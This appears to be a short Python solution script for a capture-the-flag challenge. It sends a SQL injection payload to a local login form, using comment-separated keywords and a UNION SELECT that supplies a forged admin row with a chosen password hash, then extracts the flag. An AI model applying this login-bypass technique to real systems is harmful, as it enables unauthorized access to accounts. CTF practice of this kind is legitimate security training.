#!/usr/bin/python3
from hashlib import sha256
import re
import requests

url = "http://localhost:1337/"
password = "hfz"
password_hash = sha256(password.encode()).hexdigest()

payload = f"a'and/**/1=0/**/union/**/select/**/'admin','{password_hash}$"
response = requests.post(
    url=url, data={"user": payload, "pass": password}
).text.strip()

flag = re.search("shellmates{[^}]+}", response).group(0)
print(f"Flag: {flag}")

